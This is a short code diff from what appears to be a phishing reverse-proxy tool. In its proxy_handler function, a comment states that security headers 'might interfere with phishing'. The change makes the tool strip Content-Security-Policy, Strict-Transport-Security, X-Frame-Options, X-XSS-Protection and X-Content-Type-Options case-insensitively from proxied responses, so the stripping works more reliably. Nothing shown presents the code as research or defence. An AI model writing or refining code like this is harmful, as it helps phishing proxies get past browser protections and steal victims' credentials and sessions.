@@ -2826,16 +2826,16 @@ async def proxy_handler(request):
                     debug_log("Set Access-Control-Allow-Origin to *", "DEBUG")
                 # Remove security headers that might interfere with phishing
                 security_headers_to_remove = [
-                    "Content-Security-Policy",
-                    "Content-Security-Policy-Report-Only", 
-                    "Strict-Transport-Security",
-                    "X-XSS-Protection",
-                    "X-Content-Type-Options",
-                    "X-Frame-Options",
-                ]
+                        "content-security-policy",
+                        "content-security-policy-report-only", 
+                        "strict-transport-security",
+                        "x-xss-protection",
+                        "x-content-type-options",
+                        "x-frame-options",
+                    ]
                 
-                for header in security_headers_to_remove:
-                    if header in patched_headers:
+                for header in list(patched_headers.keys()):
+                    if header.lower() in security_headers_to_remove:
                         del patched_headers[header]
                         debug_log(f"Removed security header: {header}", "DEBUG")
                 
